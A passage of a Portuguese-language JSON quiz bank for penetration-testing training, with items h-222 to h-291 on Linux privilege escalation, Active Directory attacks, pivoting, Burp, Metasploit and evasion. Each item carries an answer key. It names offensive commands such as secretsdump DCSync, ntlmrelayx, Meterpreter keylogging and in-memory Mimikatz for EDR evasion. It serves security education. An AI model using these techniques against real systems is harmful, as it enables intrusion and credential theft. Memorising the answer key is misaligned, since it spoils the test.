      "Arquivos de config da aplicação (wp-config.php, .env, config.php no webroot)",
      "/boot",
      "/usr/bin",
      "Somente no /root"
    ],
    "answer": 0,
    "exp": "Os arquivos de configuração web em /var/www/html/ contêm senhas de conexão ao banco de dados que frequentemente são reutilizadas pelo root."
  },
  {
    "id": "h-222",
    "cat": "Escalação de Privilégio",
    "q": "pspy mostra um processo root executando /usr/local/bin/check.sh a cada minuto. Qual verificação seguinte?",
    "options": [
      "ls -la /usr/local/bin/check.sh — se gravável, injete payload",
      "Formatar o disco",
      "Nada, processos root não exploráveis",
      "Trocar a senha do root"
    ],
    "answer": 0,
    "exp": "Verificar as permissões com 'ls -la' revela se o arquivo ou o diretório pai permite escrita por seu usuário para injetar comandos."
  },
  {
    "id": "h-223",
    "cat": "Windows & Active Directory",
    "q": "Enumerando AD, você descobre usuários com \"Do not require Kerberos preauthentication\". Qual ataque?",
    "options": [
      "AS-REP Roasting (GetNPUsers.py)",
      "Golden Ticket imediato",
      "SMB relay",
      "ARP spoofing"
    ],
    "answer": 0,
    "exp": "Contas com pré-autenticação Kerberos desabilitada permitem solicitar um ticket AS-REP sem senha e quebrar o hash offline (AS-REP Roasting)."
  },
  {
    "id": "h-224",
    "cat": "Windows & Active Directory",
    "q": "Você capturou um hash Kerberoastable de uma conta de serviço. Qual ferramenta quebra?",
    "options": [
      "hashcat -m 13100 ou John",
      "Nikto",
      "ffuf",
      "enum4linux"
    ],
    "answer": 0,
    "exp": "O modo 13100 no Hashcat é específico para quebrar hashes Kerberos 5 TGS-REP (Kerberoasting)."
  },
  {
    "id": "h-225",
    "cat": "Metodologia & Fundamentos",
    "q": "Num pentest web, você acha painel admin em /admin com login padrão admin:admin. Isso é:",
    "options": [
      "Credenciais default — achado válido de severidade alta",
      "Normal, não é achado",
      "Falso positivo sempre",
      "Achado só se for SQLi"
    ],
    "answer": 0,
    "exp": "Credenciais de fábrica em painéis de controle representam um achado grave de segurança devido à facilidade de comprometimento total."
  },
  {
    "id": "h-226",
    "cat": "Web Hacking & Burp",
    "q": "A aplicação gera tokens de sessão sequenciais (1001, 1002, 1003...). Que falha é essa?",
    "options": [
      "Previsibilidade de sessão — permite sequestrar sessões de outros usuários",
      "Boa prática de segurança",
      "Erro de SQL",
      "Problema de DNS"
    ],
    "answer": 0,
    "exp": "Identificadores de sessão previsíveis permitem Session Hijacking, pois um invasor pode forjar cookies válidos de qualquer usuário autenticado."
  },
  {
    "id": "h-227",
    "cat": "Forense, Malware & Evasão",
    "q": "Você tem shell num container Docker e /proc/1/cgroup mostra caminhos de container. Acesso é:",
    "options": [
      "Apenas ao container — verifique se há escape possível (socket docker montado, privileged)",
      "Automático ao host",
      "Impossível de explorar",
      "Sempre root do host"
    ],
    "answer": 0,
    "exp": "Estar dentro de um container exige buscar técnicas de Container Escape (socket /var/run/docker.sock montado, modo --privileged ou vulnerabilidades de kernel)."
  },
  {
    "id": "h-228",
    "cat": "Web Hacking & Burp",
    "q": "Encontrou /var/www/html/.htaccess com regras estranhas bloqueando /uploads. Por que ler?",
    "options": [
      "Pode revelar regras de acesso e caminhos protegidos para planejar bypass",
      "Porque é obrigatório",
      "Só contém senhas",
      "Não serve para nada"
    ],
    "answer": 0,
    "exp": "O arquivo .htaccess revela regras de reescrita, cabeçalhos de controle e filtros de extensão, facilitando o desenvolvimento de bypass direcionado."
  },
  {
    "id": "h-229",
    "cat": "Linux & Lab Setup",
    "q": "O comando cat /proc/self/environ numa shell limitada serve para:",
    "options": [
      "Ver variáveis de ambiente do processo — às vezes contém segredos/credenciais",
      "Listar usuários",
      "Escanear portas",
      "Compilar exploits"
    ],
    "answer": 0,
    "exp": "Variáveis de ambiente de processos frequentemente armazenam segredos em memória como senhas de banco, tokens de API e chaves privadas."
  },
  {
    "id": "h-230",
    "cat": "Grey Hat & Ética",
    "q": "Você encontrou chaves de API AWS num repositório público. Qual teste é apropriado (com autorização)?",
    "options": [
      "Validar se a chave está ativa e quais permissões tem (com aws sts get-caller-identity), documentando o impacto",
      "Usar a chave para minerar cripto",
      "Publicar num fórum",
      "Deletar a conta AWS"
    ],
    "answer": 0,
    "exp": "'aws sts get-caller-identity' valida a identidade da chave sem alterar nenhum recurso, servindo como comprovação segura para o relatório."
  },
  {
    "id": "h-231",
    "cat": "Linux & Lab Setup",
    "q": "Qual comando clona um repositório Git?",
    "options": [
      "git clone URL",
      "git pull --new",
      "git copy URL",
      "git install URL"
    ],
    "answer": 0,
    "exp": "'git clone <URL>' baixa o repositório completo com todos os arquivos e histórico de versões para a máquina local."
  },
  {
    "id": "h-232",
    "cat": "Linux & Lab Setup",
    "q": "Como ouvir num arquivo de log em tempo real no Linux?",
    "options": [
      "tail -f /var/log/auth.log",
      "cat --watch log",
      "head -live log",
      "log stream /var"
    ],
    "answer": 0,
    "exp": "'tail -f <arquivo>' segue (follow) o arquivo continuamente, exibindo novas linhas adicionadas em tempo real."
  },
  {
    "id": "h-233",
    "cat": "Linux & Lab Setup",
    "q": "Qual comando mostra conexões de rede ativas e portas escutando no Linux?",
    "options": [
      "ss -tulnp (ou netstat -tulnp)",
      "ip route",
      "ps -ef",
      "df -h"
    ],
    "answer": 0,
    "exp": "'ss -tulnp' lista portas TCP/UDP em modo escuta (listening) com os números de processos (PID) associados."
  },
  {
    "id": "h-234",
    "cat": "Linux & Lab Setup",
    "q": "O que faz chmod +x script.sh?",
    "options": [
      "Torna o script executável",
      "Deleta o script",
      "Criptografa o script",
      "Muda o dono"
    ],
    "answer": 0,
    "exp": "'chmod +x' adiciona o bit de execução ao arquivo, permitindo executá-lo diretamente como ./script.sh."
  },
  {
    "id": "h-235",
    "cat": "Linux & Lab Setup",
    "q": "Como comprimir uma pasta em tar.gz?",
    "options": [
      "tar -czf saida.tar.gz pasta/",
      "zip -tar pasta",
      "gzip --folder pasta",
      "tar -xzf pasta"
    ],
    "answer": 0,
    "exp": "A flag '-c' cria o arquivo, '-z' aplica compressão gzip e '-f' define o nome do arquivo final."
  },
  {
    "id": "h-236",
    "cat": "Linux & Lab Setup",
    "q": "O que -xzf faz no tar?",
    "options": [
      "Extrai (x) um arquivo gzip (z) referente ao arquivo (f)",
      "Compacta e zera",
      "Lista arquivos",
      "Verifica integridade"
    ],
    "answer": 0,
    "exp": "'tar -xzf arquivo.tar.gz' descompacta e extrai o conteúdo do arquivo tar comprimido com gzip."
  },
  {
    "id": "h-237",
    "cat": "Redes & Shells",
    "q": "Qual comando envia 1 pacote ICMP para um host?",
    "options": [
      "ping -c 1 192.168.1.10",
      "ping --once ip",
      "icmp send 1",
      "trace 1 ip"
    ],
    "answer": 0,
    "exp": "No Linux, a flag '-c 1' limita o envio do ping a exatamente 1 pacote echo request."
  },
  {
    "id": "h-238",
    "cat": "Redes & Shells",
    "q": "O traceroute serve para:",
    "options": [
      "Mostrar os saltos (roteadores) até o destino",
      "Traçar gráficos",
      "Escanear portas",
      "Quebrar senhas"
    ],
    "answer": 0,
    "exp": "Traceroute mapeia a rota de pacotes IP aumentando gradativamente o TTL para identificar cada roteador intermediário até o alvo."
  },
  {
    "id": "h-239",
    "cat": "Linux & Lab Setup",
    "q": "Como fazer download com curl salvando com o nome do arquivo original do servidor?",
    "options": [
      "curl -O URL",
      "curl --save URL",
      "curl -w file URL",
      "curl -d URL"
    ],
    "answer": 0,
    "exp": "'curl -O <URL>' (O maiúsculo) salva o arquivo localmente com o mesmo nome presente no caminho da URL remota."
  },
  {
    "id": "h-240",
    "cat": "Metodologia & Fundamentos",
    "q": "Qual comando Python moderno executa comandos do sistema de forma segura?",
    "options": [
      "subprocess.run([\"ls\",\"-la\"])",
      "python.system(\"ls\")",
      "os.execute --shell",
      "import shell; shell.run()"
    ],
    "answer": 0,
    "exp": "O módulo 'subprocess' (subprocess.run) é a biblioteca padrão recomendada no Python para executar processos externos e capturar saídas."
  },
  {
    "id": "h-241",
    "cat": "Metodologia & Fundamentos",
    "q": "Qual a diferença entre threat model e attack surface?",
    "options": [
      "Threat model = análise estruturada de ameaças; attack surface = todos os pontos onde o sistema pode ser atacado",
      "São a mesma coisa",
      "Attack surface é um antivírus",
      "Threat model é um scanner"
    ],
    "answer": 0,
    "exp": "A Superfície de Ataque é a soma de todos os pontos de entrada e portas expostas; a Modelagem de Ameaças analisa cenários prováveis de ataques sobre esses pontos."
  },
  {
    "id": "h-242",
    "cat": "Criptografia & Defesa",
    "q": "O que é hardening?",
    "options": [
      "Reduzir a superfície de ataque aplicando configurações seguras (desligar serviços, patches, permissões mínimas)",
      "Aumentar a memória do servidor",
      "Criptografar só o disco",
      "Comprar mais firewalls"
    ],
    "answer": 0,
    "exp": "Hardening é o processo de endurecimento da segurança de um sistema através de remoção de softwares desnecessários, fechamento de portas e aplicação de patches."
  },
  {
    "id": "h-243",
    "cat": "Varredura & Nmap",
    "q": "Em pentest interno, qual técnica descobre hosts vivos sem ping (ICMP bloqueado)?",
    "options": [
      "ARP scan na rede local ou TCP SYN em portas comuns",
      "Só ping mesmo",
      "DNS lookup aleatório",
      "Traceroute reverso"
    ],
    "answer": 0,
    "exp": "Em redes locais, varreduras ARP (arp-scan / nmap -PR) descobrem máquinas diretamente pela camada 2, ignorando bloqueios de firewall para ICMP."
  },
  {
    "id": "h-244",
    "cat": "Criptografia & Defesa",
    "q": "O que faz o comando echo -n \"senha\" | md5sum?",
    "options": [
      "Gera o hash MD5 da string (sem newline)",
      "Criptografa a senha",
      "Apaga a senha",
      "Compara com o /etc/shadow"
    ],
    "answer": 0,
    "exp": "O parâmetro '-n' omite a quebra de linha final (\\n), garantindo que o cálculo do hash MD5 seja exato sobre a palavra pura."
  },
  {
    "id": "h-245",
    "cat": "Linux & Lab Setup",
    "q": "Qual é a função do arquivo /etc/hosts?",
    "options": [
      "Mapear nomes de host para IPs localmente (antes do DNS)",
      "Listar senhas",
      "Configurar firewall",
      "Guardar logs"
    ],
    "answer": 0,
    "exp": "O arquivo /etc/hosts resolve nomes de domínio localmente com prioridade sobre consultas a servidores DNS externos."
  },
  {
    "id": "h-246",
    "cat": "Criptografia & Defesa",
    "q": "Por que sites em HTTP puro são um achado em pentest?",
    "options": [
      "Tráfego e credenciais trafegam sem criptografia, permitindo interceptação",
      "HTTP é mais rápido, então não é problema",
      "Só importa para SEO",
      "Nunca é um achado"
    ],
    "answer": 0,
    "exp": "HTTP não criptografado permite a qualquer agente no mesmo segmento de rede farejar cookies de autenticação e credenciais em texto claro."
  },
  {
    "id": "h-247",
    "cat": "Web Hacking & Burp",
    "q": "O que é rate limiting e por que sua ausência importa?",
    "options": [
      "Limitação de tentativas por tempo; sem ela, força bruta de login fica viável",
      "Limite de memória do servidor",
      "Tipo de cache",
      "Regra de firewall de saída"
    ],
    "answer": 0,
    "exp": "A ausência de limitação de requisições por IP ou usuário permite disparar dezenas de milhares de tentativas de login por minuto sem bloqueio."
  },
  {
    "id": "h-248",
    "cat": "Web Hacking & Burp",
    "q": "Qual header HTTP de segurança mitiga XSS refletido em navegadores modernos?",
    "options": [
      "Content-Security-Policy (CSP)",
      "Server: Apache",
      "Accept-Language",
      "Host"
    ],
    "answer": 0,
    "exp": "O cabeçalho CSP restringe as fontes autorizadas de scripts e bloqueia a execução de JavaScript inline não autorizado no navegador."
  },
  {
    "id": "h-249",
    "cat": "Labs & Treinamento",
    "q": "Em CTF, após obter user.txt, o objetivo geralmente é:",
    "options": [
      "Escalar para root e capturar root.txt",
      "Postar a flag nas redes",
      "Instalar Windows no alvo",
      "Reiniciar a máquina"
    ],
    "answer": 0,
    "exp": "O ciclo de desafio CTF padrão avança do acesso inicial (user flag) para a escalação de privilégios e controle total (root flag)."
  },
  {
    "id": "h-250",
    "cat": "Grey Hat & Ética",
    "q": "Qual característica diferencia um bom pentester de um \"script kiddie\"?",
    "options": [
      "Entender O QUE as ferramentas fazem, adaptar manualmente quando falham e documentar impacto",
      "Usar mais ferramentas ao mesmo tempo",
      "Rodar exploits aleatórios da internet",
      "Ter o Kali mais atualizado"
    ],
    "answer": 0,
    "exp": "Profissionais de elite compreendem o funcionamento dos protocolos em baixo nível, ajustam payloads manualmente e comunicam valor técnico ao cliente."
  },
  {
    "id": "h-251",
    "cat": "Windows & Active Directory",
    "q": "O que é o Active Directory (AD)?",
    "options": [
      "Serviço de diretório da Microsoft que centraliza usuários, grupos e computadores de um domínio",
      "Um antivírus corporativo",
      "Um firewall de rede",
      "Um protocolo de e-mail"
    ],
    "answer": 0,
    "exp": "Active Directory é o sistema central de gerenciamento de identidade e controle de acesso corporativo utilizado pela imensa maioria das empresas globais."
  },
  {
    "id": "h-252",
    "cat": "Windows & Active Directory",
    "q": "Qual porta/protocolo o Kerberos usa para autenticação em AD?",
    "options": [
      "Porta 88",
      "Porta 445",
      "Porta 389 apenas",
      "Porta 22"
    ],
    "answer": 0,
    "exp": "O serviço Kerberos KDC escuta na porta TCP/UDP 88 para emitir TGTs e TGSs de autenticação no domínio."
  },
  {
    "id": "h-253",
    "cat": "Windows & Active Directory",
    "q": "O que é um Domain Controller (DC)?",
    "options": [
      "Servidor que autentica usuários e aplica políticas do domínio",
      "Um switch gerenciável",
      "O roteador da empresa",
      "Um servidor de arquivos qualquer"
    ],
    "answer": 0,
    "exp": "O Controlador de Domínio armazena a base de dados do Active Directory (NTDS.dit) e valida autenticações em todo o ambiente corporativo."
  },
  {
    "id": "h-254",
    "cat": "Windows & Active Directory",
    "q": "O que significa \"domain enum\" com NetExec smb DC -u user -p pass --users?",
    "options": [
      "Listar usuários do domínio usando credenciais válidas",
      "Criar usuários no domínio",
      "Quebrar senhas de domínio",
      "Bloquear o domínio"
    ],
    "answer": 0,
    "exp": "O NetExec consulta via RPC/SMB as contas de usuários registradas no domínio, revelando descrições, privilégios e status."
  },
  {
    "id": "h-255",
    "cat": "Windows & Active Directory",
    "q": "O que é Kerberoasting?",
    "options": [
      "Solicitar TGS de contas de serviço e quebrar a senha offline",
      "Assar pães no datacenter",
      "Relay de tráfego HTTP",
      "Um tipo de phishing"
    ],
    "answer": 0,
    "exp": "Qualquer usuário autenticado no AD pode solicitar um ticket TGS para contas com Service Principal Name (SPN) e tentar quebrar o hash RC4/AES offline."
  },
  {
    "id": "h-256",
    "cat": "Windows & Active Directory",
    "q": "Qual ferramenta gráfica visualiza caminhos de ataque em AD (shortest path to Domain Admin)?",
    "options": [
      "BloodHound",
      "Maltego",
      "Wireshark",
      "Nessus"
    ],
    "answer": 0,
    "exp": "BloodHound usa a base Neo4j para encontrar rotas ocultas de privilégios (membros de grupos aninhados, permissões de escrita, sessões de admin)."
  },
  {
    "id": "h-257",
    "cat": "Windows & Active Directory",
    "q": "O que é DCSync?",
    "options": [
      "Abusar da replicação do AD para extrair hashes de todos os usuários do domínio",
      "Sincronizar relógios do domínio",
      "Backup automático do DC",
      "Reset de senha do admin"
    ],
    "answer": 0,
    "exp": "DCSync simula o comportamento de um Domain Controller requisitando a replicação de credenciais via protocolo MS-DRSR, extraindo os hashes NTLM e chaves Kerberos de todos os usuários."
  },
  {
    "id": "h-258",
    "cat": "Windows & Active Directory",
    "q": "Qual script do Impacket executa o DCSync?",
    "options": [
      "secretsdump.py dominio/admin:senha@DC",
      "hydra.py -d dominio",
      "ping.py DC",
      "upload.py admin"
    ],
    "answer": 0,
    "exp": "secretsdump.py se conecta com credenciais com direitos de replicação (DS-Replication-Get-Changes-All) e extrai o dump completo do NTDS.dit."
  },
  {
    "id": "h-259",
    "cat": "Windows & Active Directory",
    "q": "Um usuário tem GenericAll sobre o grupo \"Domain Admins\". O que isso permite?",
    "options": [
      "Adicionar-se ao grupo (e virar admin do domínio)",
      "Apenas ver o nome do grupo",
      "Nada, é permissão decorativa",
      "Resetar a senha do DC apenas"
    ],
    "answer": 0,
    "exp": "GenericAll concede controle total sobre o objeto no Active Directory, permitindo adicionar qualquer conta como membro de Domain Admins."
  },
  {
    "id": "h-260",
    "cat": "Windows & Active Directory",
    "q": "O que é NTLM relay?",
    "options": [
      "Reencaminhar o handshake NTLM de uma vítima para outro serviço, autenticando como ela",
      "Um tipo de hash mais forte",
      "Atualização do protocolo Kerberos",
      "Um antivírus de rede"
    ],
    "answer": 0,
    "exp": "No NTLM Relay, o atacante intercepta a autenticação NTLM de um cliente e a retransmite em tempo real para outro servidor da rede que não exija assinatura (SMB Signing desabilitado)."
  },
  {
    "id": "h-261",
    "cat": "Pivoting & Movimentação Lateral",
    "q": "Você comprometeu uma máquina com duas interfaces: 10.10.10.5 e 172.16.5.5. O que isso indica?",
    "options": [
      "A máquina é pivô para uma rede interna que você ainda não alcança",
      "A máquina está quebrada",
      "IPs duplicados, ignore",
      "A máquina é o Domain Controller"
    ],
    "answer": 0,
    "exp": "Máquinas dual-homed conectam duas redes distintas (DMZ e rede interna), sendo o pivô ideal para criar rotas e invadir o segmento restrito."
  },
  {
    "id": "h-262",
    "cat": "Pivoting & Movimentação Lateral",
    "q": "Qual ferramenta cria um proxy SOCKS simples a partir do alvo para o atacante?",
    "options": [
      "chisel",
      "sqlmap",
      "Nikto",
      "enum4linux"
    ],
    "answer": 0,
    "exp": "Chisel é um túnel TCP/UDP rápido escrito em Go que encapsula conexões e provê um proxy SOCKS5 através de HTTP com criptografia SSH."
  },
  {
    "id": "h-263",
    "cat": "Pivoting & Movimentação Lateral",
    "q": "Com um SOCKS proxy ativo, como rodar o Nmap através dele?",
    "options": [
      "proxychains nmap -sT -Pn 172.16.5.20",
      "nmap --socks auto",
      "nmap -p socks 172.16.5.20",
      "Não é possível"
    ],
    "answer": 0,
    "exp": "Utiliza-se 'proxychains nmap -sT -Pn <IP>' para forçar o handshake TCP connect completo através da conexão proxy SOCKS estabelecida."
  },
  {
    "id": "h-264",
    "cat": "Pivoting & Movimentação Lateral",
    "q": "Por que usar -sT (TCP connect) no Nmap através de proxy SOCKS?",
    "options": [
      "SYN scan raw não funciona através de proxy SOCKS",
      "-sT é mais silencioso",
      "SOCKS só aceita UDP",
      "Não há razão, qualquer flag funciona"
    ],
    "answer": 0,
    "exp": "Proxies SOCKS operam na camada de aplicação e não conseguem forjar pacotes brutos SYN raw (camada 3), exigindo conexões TCP completas (-sT)."
  },
  {
    "id": "h-265",
    "cat": "Pivoting & Movimentação Lateral",
    "q": "O ligolo-ng se diferencia porque:",
    "options": [
      "Cria uma interface de rede virtual, dispensando proxychains e permitindo ferramentas nativamente",
      "Só funciona em Windows",
      "É um scanner de vulnerabilidades",
      "Quebra hashes"
    ],
    "answer": 0,
    "exp": "Ligolo-ng cria um adaptador TUN local, roteando pacotes diretamente pela tabela de rotas do SO sem precisar pré-configurar proxychains."
  },
  {
    "id": "h-266",
    "cat": "Pivoting & Movimentação Lateral",
    "q": "O que é port forwarding local com SSH?",
    "options": [
      "ssh -L 8080:alvo_interno:80 user@pivo — acessa serviço interno via máquina pivô",
      "Encaminhar e-mails",
      "Redirecionar DNS",
      "Uma técnica de força bruta"
    ],
    "answer": 0,
    "exp": "A flag '-L porta_local:host_remoto:porta_remota' mapeia uma porta do host atacante diretamente para um serviço inacessível da rede interna."
  },
  {
    "id": "h-267",
    "cat": "Pivoting & Movimentação Lateral",
    "q": "Como listar rotas conhecidas numa sessão Meterpreter após pivoting?",
    "options": [
      "run autoroute -s 172.16.5.0/24 (adiciona) e route (lista)",
      "ip route print do atacante",
      "pivot --list all",
      "netstat -r remote"
    ],
    "answer": 0,
    "exp": "O comando autoroute do Metasploit direciona todo o tráfego de módulos do msfconsole através da sessão ativa comprometida."
  },
  {
    "id": "h-268",
    "cat": "Pivoting & Movimentação Lateral",
    "q": "O que é movimento lateral (lateral movement)?",
    "options": [
      "Usar credenciais/acesso obtidos para comprometer outras máquinas da rede",
      "Mover arquivos lateralmente no disco",
      "Trocar de ferramenta de scan",
      "Mover o servidor de rack"
    ],
    "answer": 0,
    "exp": "Movimentação Lateral é a técnica de saltar de um host comprometido para outros nós da rede corporativa utilizando credenciais ou vulnerabilidades internas."
  },
  {
    "id": "h-269",
    "cat": "Web Hacking & Burp",
    "q": "No Burp, você capturou um POST de login e quer testar força bruta. Qual módulo?",
    "options": [
      "Intruder ( Sniper attack com wordlist de senhas)",
      "Decoder",
      "Spider",
      "Sequencer"
    ],
    "answer": 0,
    "exp": "O Burp Intruder em modo Sniper substitui a posição demarcada no campo de senha pelas palavras da wordlist de forma sequencial."
  },
  {
    "id": "h-270",
    "cat": "Web Hacking & Burp",
    "q": "No Intruder, o que é o ataque tipo \"Sniper\"?",
    "options": [
      "Um payload position por vez, com payloads testados sequencialmente",
      "Fogo automático em todos os campos",
      "Ataque UDP",
      "Modo de relatório"
    ],
    "answer": 0,
    "exp": "No modo Sniper, cada posição de payload é testada individualmente por vez enquanto as outras posições permanecem com os valores originais."
  },
  {
    "id": "h-271",
    "cat": "Web Hacking & Burp",
    "q": "Como identificar visualmente no Intruder qual tentativa teve resultado diferente?",
    "options": [
      "Comparar length/status code das respostas na tabela de resultados",
      "Só lendo os headers um a um",
      "O Intruder não mostra resultados",
      "Via ping"
    ],
    "answer": 0,
    "exp": "Respostas com tamanho (Length) ou código HTTP (302 Redirection vs 200 OK) discrepantes sinalizam sucesso de login ou comportamento anômalo."
  },
  {
    "id": "h-272",
    "cat": "Web Hacking & Burp",
    "q": "No Burp, o que é \"match and replace\"?",
    "options": [
      "Regras automáticas que modificam requisições/respostas em trânsito (ex.: remover CSP)",
      "Um módulo de força bruta",
      "Ferramenta de decode base64",
      "Busca no histórico"
    ],
    "answer": 0,
    "exp": "Match and Replace no Proxy permite trocar cabeçalhos, cookies ou respostas automaticamente com expressões regulares sem intervenção manual."
  },
  {
    "id": "h-273",
    "cat": "Web Hacking & Burp",
    "q": "O que é o Burp Collaborator?",
    "options": [
      "Servidor externo do Burp para detectar SSRF/OOB (interações out-of-band)",
      "Um chat para a equipe de pentest",
      "Um scanner de portas integrado",
      "Um gerenciador de senhas"
    ],
    "answer": 0,
    "exp": "Burp Collaborator monitora consultas DNS, requisições HTTP e conexões SMTP disparadas pelo servidor alvo para seu subdomínio único."
  },
  {
    "id": "h-274",
    "cat": "Web Hacking & Burp",
    "q": "Por que o Collaborator ajuda a confirmar SSRF/XXE?",
    "options": [
      "Se o servidor alvo interage com seu subdomínio único, você prova que ele faz requisições externas",
      "Ele quebra a senha do servidor",
      "Ele bloqueia o firewall",
      "Ele converte XML em SQL"
    ],
    "answer": 0,
    "exp": "Como o alvo interage externamente sem retornar resposta visível na página (Blind Vulnerability), o Collaborator captura o evento e confirma a falha."
  },
  {
    "id": "h-275",
    "cat": "Web Hacking & Burp",
    "q": "No Burp Community, qual limitação incomoda no dia a dia?",
    "options": [
      "Sem scanner automático e Intruder com taxa limitada (throttling)",
      "Não intercepta HTTP",
      "Só funciona no Windows",
      "Não tem Proxy"
    ],
    "answer": 0,
    "exp": "A versão Community limita deliberadamente a velocidade de requisições no Intruder e não inclui o Vulnerability Scanner automatizado da versão Pro."
  },
  {
    "id": "h-276",
    "cat": "Metodologia & Fundamentos",
    "q": "O que guardar no final de um teste web com Burp para o relatório?",
    "options": [
      "Requests/respostas completas (evidência) de cada achado, com screenshot",
      "Apenas a URL do site",
      "A wordlist usada",
      "Nada, o cliente vê por si"
    ],
    "answer": 0,
    "exp": "A evidência bruta de requisição HTTP e resposta com timestamps é a prova cabal da vulnerabilidade necessária para os desenvolvedores corrigirem."
  },
  {
    "id": "h-277",
    "cat": "Metasploit Framework",
    "q": "O que é um \"staged\" payload (ex.: windows/x64/meterpreter/reverse_tcp)?",
    "options": [
      "Payload dividido: primeiro um stager pequeno conecta, depois carrega o restante",
      "Payload que funciona em etapas fisicas",
      "Payload com múltiplas exploits",
      "Payload só para Linux"
    ],
    "answer": 0,
    "exp": "Payloads staged entregam um pequeno stager inicial (que cabe em buffers pequenos) que se conecta e faz o download do Meterpreter completo em memória."
  },
  {
    "id": "h-278",
    "cat": "Metasploit Framework",
    "q": "Qual payload é \"stageless\" (all-in-one)?",
    "options": [
      "windows/x64/meterpreter_reverse_tcp (sem barra indicando stage separado)",
      "reverse_tcp normal",
      "bind_tcp com LPORT",
      "Nenhum existe"
    ],
    "answer": 0,
    "exp": "No Metasploit, payloads com underline (meterpreter_reverse_tcp) são binários completos sem dependência de download de estágios adicionais."
  },
  {
    "id": "h-279",
    "cat": "Metasploit Framework",
    "q": "No Meterpreter, como enviar um arquivo para o alvo?",
    "options": [
      "upload /caminho/local/alvo_destino",
      "put file",
      "send --file",
      "copy -r"
    ],
    "answer": 0,
    "exp": "'upload <origem> <destino>' transfere binários, scripts e ferramentas diretamente para o disco da vítima através da sessão ativa."
  },
  {
    "id": "h-280",
    "cat": "Metasploit Framework",
    "q": "No Meterpreter, como capturar teclas digitadas no Windows?",
    "options": [
      "keyscan_start e keyscan_dump",
      "log keys",
      "capture keyboard",
      "sniff -k"
    ],
    "answer": 0,
    "exp": "'keyscan_start' inicia o keylogger em memória e 'keyscan_dump' imprime todas as teclas digitadas pelo usuário no sistema."
  },
  {
    "id": "h-281",
    "cat": "Metasploit Framework",
    "q": "O que o módulo post/multi/manage/autoroute faz?",
    "options": [
      "Adiciona rotas para redes internas acessíveis via sessão comprometida",
      "Instala um roteador",
      "Escaneia rotas de voo",
      "Bloqueia o tráfego"
    ],
    "answer": 0,
    "exp": "Ele configura automaticamente tabelas de roteamento no Metasploit para alcançar sub-redes corporativas usando a sessão como gateway."
  },
  {
    "id": "h-282",
    "cat": "Metasploit Framework",
    "q": "Por que rodar local_exploit_suggester após obter sessão Windows?",
    "options": [
      "Sugere exploits locais de escalação de privilégio com base no patch level do alvo",
      "Sugere exploits remotos de rede",
      "Gera o relatório",
      "Desativa o antivírus"
    ],
    "answer": 0,
    "exp": "O módulo 'post/multi/recon/local_exploit_suggester' compara a versão do sistema com vulnerabilidades conhecidas para indicar caminhos de elevação a SYSTEM."
  },
  {
    "id": "h-283",
    "cat": "Forense, Malware & Evasão",
    "q": "O que é \"migration\" no Meterpreter?",
    "options": [
      "Mover o payload para outro processo legítimo (ex.: explorer.exe) para estabilidade/evasão",
      "Migrar o servidor de datacenter",
      "Trocar de exploit",
      "Mover arquivos entre pastas"
    ],
    "answer": 0,
    "exp": "'migrate <PID>' injeta a thread do Meterpreter dentro de um processo nativo estável (como explorer.exe ou svchost.exe), prevenindo perda de sessão."
  },
  {
    "id": "h-284",
    "cat": "Senhas & Força Bruta",
    "q": "Qual comando gera wordlists de credenciais customizadas a partir de dados do alvo (nomes, datas)?",
    "options": [
      "cewl (e crunch para máscaras)",
      "hydra --generate",
      "john --make",
      "nmap --words"
    ],
    "answer": 0,
    "exp": "CeWL faz spidering no site corporativo extraindo vocabulário e termos específicos da empresa para criar dicionários de alta probabilidade."
  },
  {
    "id": "h-285",
    "cat": "Windows & Active Directory",
    "q": "O que faz o Responder numa rede Windows?",
    "options": [
      "Envenena LLMNR/NBT-NS e captura hashes NTLMv2 de clientes da rede",
      "Responde pings mais rápido",
      "Escaneia vulnerabilidades web",
      "Criptografa o DNS"
    ],
    "answer": 0,
    "exp": "Quando máquinas Windows tentam resolver nomes de servidores inexistentes, o Responder finge ser o destino e captura os hashes NTLMv2 enviados na autenticação."
  },
  {
    "id": "h-286",
    "cat": "Senhas & Força Bruta",
    "q": "Com hashes NTLMv2 capturados pelo Responder, qual ferramenta quebra?",
    "options": [
      "hashcat -m 5600",
      "Nikto",
      "gobuster",
      "enum4linux"
    ],
    "answer": 0,
    "exp": "O modo '-m 5600' no Hashcat é o algoritmo dedicado para quebra de hashes NetNTLMv2 capturados em ataques de rede."
  },
  {
    "id": "h-287",
    "cat": "Windows & Active Directory",
    "q": "O que é o ataque SMB Relay (ntlmrelayx)?",
    "options": [
      "Reencaminhar o hash capturado para outra máquina (sem assinatura SMB) e autenticar sem conhecer a senha",
      "Enviar spam por SMB",
      "Um backup de rede",
      "Um tipo de VPN"
    ],
    "answer": 0,
    "exp": "ntlmrelayx encaminha o desafio NTLM recebido para alvos sem SMB Signing, concedendo execução remota de código sem precisar quebrar a senha."
  },
  {
    "id": "h-288",
    "cat": "Windows & Active Directory",
    "q": "Qual mitigação impede SMB Relay?",
    "options": [
      "SMB Signing obrigatório (e desabilitar LLMNR/NBT-NS)",
      "Mais RAM no servidor",
      "Trocar de switch",
      "Antivírus atualizado"
    ],
    "answer": 0,
    "exp": "Habilitar assinatura digital obrigatória (Require SMB Signing) em todos os hosts e servidores impede a adulteração e retransmissão de autenticações."
  },
  {
    "id": "h-289",
    "cat": "Windows & Active Directory",
    "q": "O evil-winrm é usado para:",
    "options": [
      "Obter shell PowerShell via WinRM com credenciais/hashes válidos",
      "Escanear portas WinRM apenas",
      "Quebrar Wi-Fi",
      "Relatório automático"
    ],
    "answer": 0,
    "exp": "evil-winrm permite carregar scripts PowerShell na memória, executar binários sem tocar no disco e usar hashes NTLM direto com a flag '-H'."
  },
  {
    "id": "h-290",
    "cat": "Windows & Active Directory",
    "q": "O que faz mimikatz num host Windows comprometido (com privilégios)?",
    "options": [
      "Extrai credenciais da memória (LSASS), hashes NTLM e tickets Kerberos",
      "Instala patches",
      "Escaneia a rede",
      "Formata o disco"
    ],
    "answer": 0,
    "exp": "Mimikatz (de Benjamin Delpy) analisa a memória do processo lsass.exe, recuperando senhas em texto claro, hashes NTLM, tickets Kerberos e certificados."
  },
  {
    "id": "h-291",
    "cat": "Forense, Malware & Evasão",
    "q": "Qual técnica evita jogar binários de ferramentas no disco do alvo (detectáveis por EDR)?",
    "options": [
      "Execução in-memory (ex.: PowerShell reflexive, Invoke-Mimikatz) ou \"living off the land\"",
      "Renomear o binário para notepad.exe",
      "Compactar em ZIP",
      "Enviar por e-mail"
    ],
    "answer": 0,
